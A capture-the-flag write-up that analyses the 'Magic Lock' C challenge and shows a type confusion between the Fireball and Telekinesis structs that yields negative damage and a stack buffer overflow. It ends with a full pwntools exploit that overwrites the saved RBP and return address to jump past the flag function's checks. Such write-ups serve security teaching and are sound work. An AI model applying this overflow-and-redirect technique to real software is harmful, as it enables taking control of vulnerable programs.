# Magic Lock

---

> Description: ???
> 
> Difficulty: Medium
> 
> Files: [magiclock.c](./magiclock.c) [def.h](./def.h) [magiclock](./magiclock)

---

## Playing Around

Running the binary, we are welcomed with a menu

```python
$ ./magiclock
==========================
You are trapped in a cage in a dark cave
The cage is sealed by a magic lock
What do you do?
==========================

1)Attempt to pick the lock

2)Cast Spell

3)Review your Spell Book

4)Yell for HELP!

```

Running each option give uninteresting results so we will delve straight into the source code.

## Source Code Analysis

Skimming through the code, we instantly find an interesting function which gives us our flag given the correct arguments.

```c
int unlock_lock(unsigned int passcode1, long unsigned int passcode2, long unsigned int passcode3)
{
    FILE *fp;
    char *flag;
    long fsize;

    // Validate
    if (passcode1 == 0xfeedbeef && passcode2 != 0xdeadcafebabebeef && passcode3 != 0xdeadcafebabebeef)
    {
        // Send error
        printf( "Rogue Magic Disspelled! Invalid Spell Arg");
        return 1;
    }

    // Opening file for reading
    fp = fopen("flag.txt" , "rb");
    if(fp == NULL)
    {
      perror("Error opening file");
      return(-1);
    }

    // Read flag
    fseek(fp, 0, SEEK_END);
    fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    flag = (char*)malloc(fsize + 1);
    fread(flag, fsize, 1, fp);
    fclose(fp);

    *(flag+fsize) = 0;

    // Send back flag
    printf(flag);

    // Close file
    fclose(fp);
    return 0;

}
```

However, there are no other function that calls it. This means that we somehow have to exploit the program to call this function and read the flag.

Let's keep this at the back of our head for now as we continue scanning the source code for vulnerable functions.

If we read the source code, we can find another interesting function that reads in an input of size `recv_len`. 

If we are able to somehow control `recv_len` to be bigger than 30, we can overflow and control our intruction pointer.

```c
int cast_spell(int recv_len )
{
    // Read userinput
    char buffer[30];

    // Receive the spell
    getchar();
    fgets(buffer, recv_len, stdin);

    return 0;
}
```

Now if we look at the `start` function

```c
int start()
{
    char buffer[10];
    int option = 1;

    // Init spell
    Spell= (void*)malloc(sizeof(Telekenisis));

    // Init Fireball default spell
    strcpy(Spell+4, "Fireball");
    *(unsigned short*)Spell = 50;
    *(short*)(Spell+2) = 50;

    CurrentSpellType = 1;

    // Get user menu input
    while(1)
    {
        printf(menu_msg);

        scanf("%1s", buffer);
        option = atoi(buffer);

        if (option==1)
        {
            printf(option1);
        }
        else if (option==2)
        {
            printf( castmsg);
            int recv_len = calc_recv();

            if (recv_len == 1)
            {
                continue;
            }

            cast_spell(recv_len);
            printf( castfailmsg);
        }
        else if (option==3)
        {
            configure_spell();
        }
        else if (option==4)
        {
            printf(option4);
        }
    }

    // Cleanup
    free(Spell);
    return 0;
```

We can see that the options 1 and 4 in the menu are useless.

Option 2 will calculate our `recv_len` and run the `cast_spell(recv_len)` function.

```c
int calc_recv()
{
    int recv_len =30;

    // Calc Receive length based on spell type dmg
    if (CurrentSpellType == 1)
    {
        if (((pFireball)Spell)->dmg >= 30)
        {
            printf(errmsg);
            return 1;
        }
        recv_len = recv_len - ((pFireball)Spell)->dmg;
    }
    else
    {
        if (((pTelekenisis)Spell)->dmg >= 30)
        {
            printf(errmsg);
            return 1;
        }
        recv_len = recv_len - ((pTelekenisis)Spell)->dmg;
    }

    if (recv_len <= 0)
    {
        printf(errmsg);
        return 1;
    }

    if (recv_len > 30)
    {
        printf(recvmsg2);
    }
    else
    {
        printf(recvmsg);
    }

    return recv_len;
}

```

From this function, we can see that `recv_len = recv_len - some_value`. 

Thus the only way to get a `recv_len` greather than 30 would be to have a negative damage.

How is this possible? We can look at the implementation of `Fireball` and `Telekinesis` as well as the configure spell function.

```c
int configure_spell()
{
    char buffer[10];
    int option;
    int userinput;

    // Get user menu input
    char spellbookmsg[] = ""
    "==========================\n"
    "You open your spellbook\n"
    "There is a variety of spells in it\n"
    "You decide to use your signature spells\n\n"
    "Choose a Spell!\n"
    "==========================\n\n"
    "1)Fireball\n\n"
    "2)Telekenisis\n\n";

    printf(spellbookmsg);

    // Read userinput
    scanf("%1s", buffer);
    option = atoi(buffer);

    // Fireball
    if (option == 1)
    {
        char errmsg[] = ""
        "\n==========================\n"
        "Invalid Input. The magic fizzles\n"
        "==========================\n\n";

        strcpy((Spell+4), "Fireball");
        CurrentSpellType = 1;

        // Set size
        printf("What is the size of the fireball? (1-65535)");
        scanf("%5s", buffer);
        userinput = atoi(buffer);

        if (userinput >=1 && userinput <=65535)
        {
            *(short*)(Spell) = (short)userinput;
        }
        else
        {
            printf(errmsg);
            return 1;
        }

        // Set dmg
        printf("How much damage does the fireball do? (1-100)");
        scanf("%3s", buffer);
        userinput = atoi(buffer);

        if (userinput >=1 && userinput <=100)
        {
            *(short*)(Spell+2) = (short)userinput;
        }
        else
        {
            printf(errmsg);
            return 1;
        }

    }


    // Telekenisis
    if (option == 2)
    {
        strcpy((Spell+4), "Telekenisis");
        CurrentSpellType = 2;

        // Set dmg
        printf("How much damage does the telekenisis do? (1-100)");
        scanf("%3s", buffer);
        userinput = atoi(buffer);

        if (userinput >=1 && userinput <=100)
        {
            *(short*)(Spell) = (short)userinput;
        }
        else
        {
            printf(errmsg);
            return 1;
        }

        // Set dist
        printf("What is the distance of the telekenisis? (1-100)");
        scanf("%3s", buffer);
        userinput = atoi(buffer);

        if (userinput >=1 && userinput <=100)
        {
            *(short*)(Spell+2) = (short)userinput;
        }
        else
        {
            printf(errmsg);
            return 1;
        }
    }

    return 0;
}

```

```c
// def.h

// Spells format
typedef struct {
    unsigned short size;
    short dmg;
    char name[12];
} Fireball, *pFireball;


typedef struct {
    short dmg;
    short distance;
    char name[12];
} Telekenisis, *pTelekenisis;

```

As we can see from the code, although Fireball and Telekenesis are different structs, they share the same memory and are differentiated by the value of `CurrentSpellType`.

The `unsigned short size` variable in a Fireball shares the same memory as the `short dmg` variable in Telekenesis.

If we can somehow provide a sufficiently large `unsigned short size` for a Fireball, and confuse the program that it is a `Telekenesis` spell, then the dmg of `Telekenesis` will be negative when when the `unsigned short` is converted to a `signed short`.

```c
// Set size
printf("What is the size of the fireball? (1-65535)");
scanf("%5s", buffer);
userinput = atoi(buffer);

if (userinput >=1 && userinput <=65535)
{
    *(short*)(Spell) = (short)userinput;
}
```

This part of the code allows us to set `userInput` to a value between **1** and **65535**.

_p.s. 65535 corresponds to -1 in a signed short variable since signed short range is -32768 to 32767_

```c

if (option == 2)
{
    strcpy((Spell+4), "Telekenisis");
    CurrentSpellType = 2;

    // Set dmg
    printf("How much damage does the telekenisis do? (1-100)");
    scanf("%3s", buffer);
    userinput = atoi(buffer);

    if (userinput >=1 && userinput <=100)
    {
        *(short*)(Spell) = (short)userinput;
    }
    else
    {
        printf(errmsg);
        return 1;
    }
```

This part of the code allows us to change the `CurrentSpellType` to Telekenisis whilst keeping the values we set for our `Fireball`.

## Exploit

Essentially, the vulnerability is that -- we are able to, via type/spell confusion, treat an `unsigned short` as a `signed short` and thus have a negative damage, allowing us to have a `recv_len > 30` and overflow our buffer.

Upon overflowing our buffer, we can set our return address to the middle of the flag function right after the checks, so we don't have to deal with the pesky argument checks.

Do note that we have to provide a **valid** saved RBP value _(the 8 bytes right before return address)_ so our program don't crash when trying to move variables in and out of the stack, relative to our RBP.

```python
from pwn import *

p = process("./magiclock")

MPROMPT = b"HELP!\n"
CPROMPT = b"2)Telekenisis\n"

p.sendlineafter(MPROMPT, b"3")              # Configure our spell
p.sendlineafter(CPROMPT, b"1")              # as a Fireball
p.sendlineafter(b"(1-65535)", b"64536")     # with a size of 64536, which is also -1000 in signed short.
p.sendlineafter(b"(1-100)", b"100")

p.sendlineafter(MPROMPT, b"3")              # Configure our spell
p.sendlineafter(CPROMPT, b"2")              # as a Telekinesis
p.sendlineafter(b"(1-100)", b"abc")         # Provide an invalid input so we do not tamper with the values set as a Fireball

p.sendlineafter(MPROMPT, b"2")              # Fire our spell

payload = b"A"*32                           # Overflow our return address
payload += p64(0x405100)                    # Provide a valid RBP so our program doesn't crash
payload += p64(0x0000000000402231)          # jump in the middle of the flag function to bypass the checks

p.sendline(payload)

p.interactive()

"""
OUTPUT:
[+] Starting local process './magiclock': pid 50329
[*] Switching to interactive mode


=============================
You close your eyes to conjur the mana within...
==============================


=============================
The air around you starts to vibrate.
Now all thats left is to unleash the arcane!

You've got a good feeling about this!
==============================

stf{FLAG}
"""
```

